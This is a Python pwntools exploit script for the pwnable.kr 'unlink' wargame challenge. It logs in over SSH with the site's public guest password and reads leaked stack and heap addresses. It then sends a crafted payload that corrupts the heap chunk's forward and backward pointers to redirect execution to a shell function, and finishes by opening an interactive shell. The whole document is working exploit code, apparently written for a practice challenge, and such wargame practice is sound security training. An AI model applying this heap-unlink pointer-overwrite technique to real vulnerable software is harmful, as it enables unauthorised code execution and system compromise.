from pwn import *

def get_process(remote=False):
    p = None
    if remote:
        sh = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
        p = sh.process('./unlink')
    else:
        p = process('./unlink')
    return p

p = get_process(True)

# Receive stack leak as hex and parse it
p.recvuntil(b'stack address leak: ')
stack_leak = int(p.recvline().decode('unicode_escape').replace('0x', ''), 16)
print(hex(stack_leak))

# Receive heap leak as hex and do the same
p.recvuntil(b'heap address leak: ')
heap_leak = int(p.recvline().decode('unicode_escape').replace('0x', ''), 16)
print(hex(heap_leak))

shell_function = 0x080484eb
bk_offset = 4
prev_chunk_size = 24
chunk_size = 24

# Store shell function address in the heap for next dereference
payload = p32(shell_function)
payload += b'A'*12
# Change fd and bk pointers
payload += p32(stack_leak + 16 - bk_offset) # Forward pointer (Remove the offset when indexing FD->bk)
payload += p32(heap_leak + 8 + 4) # Backwards pointer (shell function)

p.sendlineafter(b'get shell!', payload)

p.interactive()
